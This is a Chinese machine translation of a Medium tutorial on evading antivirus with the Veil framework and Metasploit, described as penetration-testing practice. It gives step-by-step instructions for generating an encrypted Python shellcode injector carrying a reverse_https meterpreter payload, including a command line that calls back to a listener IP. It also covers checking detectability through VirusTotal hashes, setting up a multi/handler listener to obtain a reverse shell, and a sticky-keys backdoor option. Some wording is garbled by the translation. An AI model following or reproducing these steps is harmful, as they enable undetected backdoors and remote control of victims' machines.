> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [medium.com](https://medium.com/@arshiadev/how-to-bypass-antiviruses-by-veil-framework-ac8f2fbc5383)

> 杀伤链的利用阶段对于渗透测试人员或攻击者来说是最危险的阶段......

杀伤链的利用阶段对于渗透测试人员或攻击者来说是最危险的阶段，因为他们直接与目标网络或系统进行交互，并且他们的活动被记录或身份被发现的风险很高。同样，必须采用隐身来将测试人员的风险降至最低。尽管没有无法检测到的特定方法或工具，但有一些配置更改和特定工具会使检测更加困难。

在考虑远程攻击时，大多数网络和系统采用各种类型的防御控制来最大限度地降低攻击风险。网络设备包括路由器、防火墙、入侵检测和预防系统以及恶意软件检测软件。

为了便于利用，大多数框架都包含使攻击有些隐秘的功能。Metasploit 框架允许您在逐个漏洞利用的基础上手动设置规避因素，确定哪些因素（如加密、端口号、文件名等）可能难以设置，并且将针对每个特定 ID 进行更改。Metasploit 框架还允许加密目标和攻击系统之间的通信（windows/meterpreter/reverse_tcp_rc4 有效负载），从而难以检测到漏洞利用有效负载。

**Metasploit Pro (Nexpose) 可作为 Kali 发行版的试用版，包括以下内容以专门绕过入侵检测系统：**

1.  可以在 Discovery Scan 的设置中调整扫描速度，通过将速度设置为偷偷摸摸或偏执来降低与目标交互的速度。
2.  这通过发送较小的 TCP 数据包并增加数据包之间的传输时间来实现传输规避。
3.  这减少了针对目标系统同时发起的攻击的数量。
4.  对于涉及 DCERPC、HTTP 和 SMB 的漏洞利用，可以自动设置特定于应用程序的 Evasion 选项。

大多数防病毒软件依靠签名匹配来定位病毒、勒索软件或任何其他恶意软件。他们检查每个可执行文件中已知存在于病毒中的代码字符串（签名），并在检测到可疑字符串时发出警报。Metasploit 的许多攻击都依赖于可能具有签名的文件，随着时间的推移，该签名已被防病毒供应商识别。

作为对此的回应，Metasploit 框架允许对独立的可执行文件进行编码以绕过检测。不幸的是，在诸如 virustotal.com 等公共网站上对这些可执行文件进行了广泛的测试，降低了它们绕过 AV 软件的有效性。但是，这导致 Veil 和 Shellter 等框架通过交叉验证可执行文件来绕过 AV 软件，方法是在将后门植入目标环境之前将它们直接上传到 VirusTotal。

Veil 框架是另一个 AV-Evasion 框架，由 Chris Truncer 编写，称为 Veil-Evasion (www.veil-framework.com)，它提供有效的保护和检测任何针对端点和服务器的独立漏洞利用。截至 2018 年 12 月，Veil 框架的最新版本是 3.1.11。该框架由两个工具组成：Evasion 和 Ordnance。

Evasion 将各种技术聚合到一个简化管理的框架中，Ordnance 为支持的有效负载生成 shellcode，以进一步针对已知漏洞创建新的漏洞利用。

**作为一个框架，Veil 具有几个特性，其中包括：**

1.  它结合了多种编程语言（包括 C、C# 和 Python）中的自定义 shellcode。
2.  它可以使用 Metasploit 生成的 shellcode，也可以使用 Ordnance 创建自己的 shellcode。
3.  它可以集成第三方工具，例如 Hyperion（使用 AES 128 位加密对 EXE 文件进行加密）、PEScrambler 和 BackDoor Factory。
4.  可以生成有效负载并将其无缝替换到所有 PsExec、Python 和 .exe 调用中。
5.  用户可以重用 shellcode 或实现自己的加密方法。
6.  它的功能可以编写脚本来自动部署。
7.  Veil 正在不断开发中，并且该框架已通过 Veil-Evasion-Catapult（有效载荷传送系统）等模块进行了扩展。

**Veil 可以生成漏洞利用载荷；独立有效负载包括以下选项：**

1.  调用 shellcode 的最小 Python 安装；它上传了一个最小的 Python.zip 安装和 7Zip 二进制文件。Python 环境被解压，调用 shellcode。由于唯一与受害者交互的文件是受信任的 Python 库和解释器，因此受害者的 AV 不会检测到任何异常活动。
2.  Sethc 后门将受害者的注册表配置为启动 RDP 粘滞密钥后门。
3.  PowerShell shellcode 注入器。

**创建有效负载后，可以通过以下两种方式之一将它们传递到目标：**

4. 使用 Impacket 和 PTH 工具包上传和执行

5. UNC 调用

Veil 框架可从 Kali 存储库获得，只需在终端中输入 apt-get install veil 即可自动安装。

**小费：**

如果您在安装过程中收到任何错误，请重新运行 /usr/share/veil/config/setup.sh —force —silent。

**Veil 向用户展示了主菜单，它提供了两个可供选择的工具和许多加载的有效负载模块，以及可用的命令。键入 use Evasion 将带我们进入 Evasion 工具和 list 命令，该命令将列出所有可用的有效负载。Veil 框架的初始启动屏幕显示在以下屏幕截图中：**

![](https://miro.medium.com/max/648/1*ZuRxIDfg2MFzPISiGcp7nA.jpeg)

**Veil 框架正在快速发展，每月都有重要的发布，重要的升级更频繁地发生。目前，在 Evasion 工具中，有 41 个有效载荷旨在通过加密或直接注入内存空间来绕过杀毒软件。这些有效负载显示在以下屏幕截图中：**

![](https://miro.medium.com/max/714/1*CO7DLeVL3g-KHka02Ou-LA.jpeg)

**要获取有关特定负载的信息，请键入 info 或 info 以自动完成可用的负载。您也可以只输入列表中的数字。在以下示例中，我们输入 29 以通过运行 use 29 来选择 python/shellcode_inject/aes_encrypt 有效负载：**

![](https://miro.medium.com/max/709/1*9UGlBHUf_uOADN0v52OVPg.jpeg)

该漏洞利用包括 expire_payload 选项。如果目标用户没有在指定的时间范围内执行该模块，则该模块将被渲染为不可操作，并且它还包括 CLICKTRACK，它设置用户必须进行多少次点击才能执行有效负载的值。此功能有助于攻击的隐蔽性。

一些必需的选项预先填充了默认值和描述。如果默认情况下未完成所需的值，则测试人员将需要输入一个值，然后才能生成有效负载。要设置选项的值，请输入 set，然后键入所需的值。要接受默认选项并创建漏洞利用，请在命令提示符中键入 generate。

**如果负载使用 shellcode，您将看到 shellcode 菜单，您可以从以下屏幕截图中列出的选项中进行选择：**

![](https://miro.medium.com/max/720/1*dfD4AisLtyxphJSXN0FGSA.jpeg)

默认情况下，Ordnance 是您可以生成特定 shellcode 的地方；如果有错误，它将默认为 msfvenom 或自定义 shellcode。如果选择了自定义 shellcode 选项，请以 \x01\x02 的形式输入 shellcode，不带引号和换行符 (\n)。如果选择了默认的 msfvenom，系统将提示您选择 windows/meterpreter/reverse_tcp 的默认有效负载。如果您希望使用另一个有效负载，请按 Tab 键以完成可用的有效负载。可用的有效载荷显示在以下屏幕截图中：

![](https://miro.medium.com/max/709/1*XFW5Jj_3DEz7aGPAx5w_xg.jpeg)

**在下面的屏幕截图中，tab 命令用于演示一些可用的有效载荷；但是，选择了默认值 (windows/meterpreter/reverse_https)：**

![](https://miro.medium.com/max/719/1*KIJaFQO_zu_lBbP4MtJ1uw.jpeg)

**然后将向用户显示输出菜单，并提示选择生成的有效负载文件的基本名称。如果负载是基于 Python 的，并且您选择了 compile_to_exe 作为选项，则用户可以选择使用 Pyinstaller 创建 EXE 文件，或者使用 Py2Exe。EXE 生成完成后，您应该能够看到以下内容：**

![](https://miro.medium.com/max/718/1*EkKaf59Wa3qKks_xlKkpfw.jpeg)

**也可以使用以下选项直接从命令行创建漏洞利用：**

kali@linux:~./ t Evasion -p 29 — ordnance-payload rev_https — ip 192.168.1.7 — 端口 443 -o Outfile

创建漏洞利用后，测试人员应针对 VirusTotal 验证有效负载，以确保将其放置在目标系统上时不会触发警报。如果负载样本直接提交给 VirusTotal 并且其行为将其标记为恶意软件，则反病毒供应商可以在短短一小时内发布针对提交的签名更新。这就是为什么明确告诫用户不要将样本提交给任何在线扫描仪的原因！信息。

**Veil-Evasion 允许测试人员对 VirusTotal 进行安全检查。创建任何有效负载时，都会创建一个 SHA1 哈希并将其添加到位于 ~/veil-output 目录中的 hashes.txt 中。测试人员可以调用 checkvt 脚本将哈希提交给 VirusTotal，VirusTotal 将根据其恶意软件数据库检查 SHA1 哈希值。如果 Veil-Evasion 有效负载触发匹配，则测试人员知道它可能被目标系统检测到。如果未触发匹配，则漏洞利用负载将绕过防病毒软件。使用 checkvt 命令成功查找（AV 无法检测到）如下所示：**

![](https://miro.medium.com/max/490/1*2NuGCJQv258mCSQIHx0VZw.jpeg)

迄今为止的测试支持发现，如果 checkvt 没有在 VirusTotal 上找到匹配项，则目标的防病毒软件将不会检测到有效负载。要与 Metasploit 框架一起使用，请使用 exploit/multi/handler 并将 PAYLOAD 设置为 windows/meterpreter/reverse_https（与 Veil-Evasion 有效负载选项相同），以及用于 Veil-Evasion 的相同 LHOST 和 LPORT。当侦听器正常工作时，将漏洞利用发送到目标系统。当监听器启动它时，它会建立一个反向 shell 返回到攻击者的系统。